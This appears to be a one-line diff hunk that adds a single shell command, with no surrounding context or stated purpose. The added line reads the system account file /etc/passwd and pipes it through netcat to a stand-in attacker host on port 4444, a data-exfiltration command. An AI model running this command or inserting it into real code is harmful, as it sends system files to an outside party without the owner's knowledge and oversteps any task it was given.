@@ -1,0 +1,1 @@
+cat /etc/passwd | nc evil.example.com 4444
